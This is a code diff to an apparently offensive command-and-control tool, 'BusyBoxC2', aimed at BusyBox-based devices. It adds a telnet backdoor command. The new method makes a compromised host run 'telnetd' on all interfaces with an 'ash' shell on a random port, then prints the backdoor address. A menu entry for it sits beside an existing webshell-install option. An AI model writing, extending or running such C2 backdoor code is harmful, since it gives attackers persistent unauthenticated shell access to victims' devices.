@@ -179,6 +179,12 @@ class BusyBoxC2:
 
         self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
 
+    def _telnet_backdoor(self):
+        listening_port = random.randint(1024, 65534)
+        cmd = "telnetd -b 0.0.0.0:" + str(listening_port) + " -l ash"
+        self._send_cmd(cmd)
+        print(f"[*] Your telnet backdoor is ready on telnet://{self.server_ip}:{listening_port}")
+
     def run(self):
         try:
             while True:
@@ -209,6 +215,8 @@ class BusyBoxC2:
                         case '/install_webshell':
                             # work only without obfuscation
                             self._install_webshell()
+                        case '/telnet_backdoor':
+                            self._telnet_backdoor()
                         case '/load_prompt':
                             self.options.append('load_prompt')
                             self._load_prompt()
